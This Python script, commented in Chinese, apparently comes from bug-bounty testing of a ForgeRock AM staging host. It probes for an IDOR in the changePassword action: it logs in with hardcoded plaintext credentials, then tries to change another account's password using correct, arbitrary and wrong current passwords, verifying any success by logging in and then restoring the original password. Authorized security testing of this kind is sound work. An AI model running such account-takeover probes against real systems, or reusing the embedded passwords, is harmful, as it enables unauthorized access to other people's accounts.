# -*- coding: utf-8 -*-
"""AIC 第五十八轮:C/D 段补测——他人 ID changePassword 的 currentpassword 行为
A 段已证:自己 + 错误 currentpassword -> 400 "Old password is incorrect."(校验存在)
B 段已证:自己 + 正确 currentpassword -> 200 生效
本轮:
C. regtest1644(我的注册账号,密码 RegTest1644!x)+ 正确 currentpassword
   -> 200 = action 可作用于他人(但需旧密码,无洞);400/403 = 检查存在
D. regtest1644 + 任意 currentpassword -> 若 200 = 任意账号接管(Critical!)
E. regtest1644 + 错误 currentpassword -> 400 = 校验同样存在(与 A 对照)
"""
import requests, urllib3, json, time
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
COOKIE_NAME = 'aa942d46ece12ce'
NEWPASS = 'PccpChanged2026!x'
REG1644_PASS = 'RegTest1644!x'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

def login(u=USER, p=PASS):
    r = S.post(AUTH, json={}, timeout=15, verify=False)
    d = r.json()
    authId = d['authId']
    cbs = []
    for cb in d.get('callbacks', []):
        t = cb['type']
        inp = [{'name': 'IDToken1', 'value': u}] if t == 'NameCallback' else \
              [{'name': 'IDToken2', 'value': p}] if t == 'PasswordCallback' else \
              [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
        cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
    r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
    return r2.json().get('tokenId')

tok = login()
S.headers.update({'Cookie': COOKIE_NAME + '=' + tok,
                  'Accept-API-Version': 'resource=2.1, protocol=1.0'})
print('LOGIN OK')

UP = BASE + '/am/json/realms/root/realms/alpha/users/%s?_action=changePassword'

print('\n=== C. regtest1644 + 正确 currentpassword ===')
r = S.post(UP % 'regtest1644', json={'currentpassword': REG1644_PASS, 'userpassword': NEWPASS}, timeout=12, verify=False)
print('正确 cp -> %d %s' % (r.status_code, r.text[:150].replace('\n', ' ')))
if r.status_code == 200:
    print('  !! 他人 changePassword 200! 用新密码登录验证:')
    tok2 = login(u='regtest1644', p=NEWPASS)
    print('  新密码登录: %s' % ('SUCCESS!' if tok2 else 'FAILED'))
    if tok2:
        r3 = S.post(UP % 'regtest1644', json={'currentpassword': NEWPASS, 'userpassword': REG1644_PASS}, timeout=12, verify=False)
        print('  改回原密码: %d' % r3.status_code)
        tok4 = login(u='regtest1644', p=REG1644_PASS)
        print('  原密码恢复验证: %s' % ('OK' if tok4 else 'FAILED!'))
elif r.status_code == 403:
    print('  403 = action 级 IDOR 检查存在(与 PUT 一致)')
elif 'incorrect' in r.text:
    print('  400 incorrect = currentpassword 校验存在')

print('\n=== D. regtest1644 + 任意 currentpassword ===')
r = S.post(UP % 'regtest1644', json={'currentpassword': 'Arbitrary123!', 'userpassword': NEWPASS}, timeout=12, verify=False)
print('任意 cp -> %d %s' % (r.status_code, r.text[:150].replace('\n', ' ')))
if r.status_code == 200:
    print('  !!!!!! 任意账号接管! 登录验证:')
    tok5 = login(u='regtest1644', p=NEWPASS)
    print('  登录: %s' % ('SUCCESS!' if tok5 else 'FAILED'))
    if tok5:
        S.post(UP % 'regtest1644', json={'currentpassword': NEWPASS, 'userpassword': REG1644_PASS}, timeout=12, verify=False)
        print('  已改回')

print('\n=== E. regtest1644 + 错误 currentpassword ===')
r = S.post(UP % 'regtest1644', json={'currentpassword': 'WrongOld!', 'userpassword': NEWPASS}, timeout=12, verify=False)
print('错误 cp -> %d %s' % (r.status_code, r.text[:150].replace('\n', ' ')))
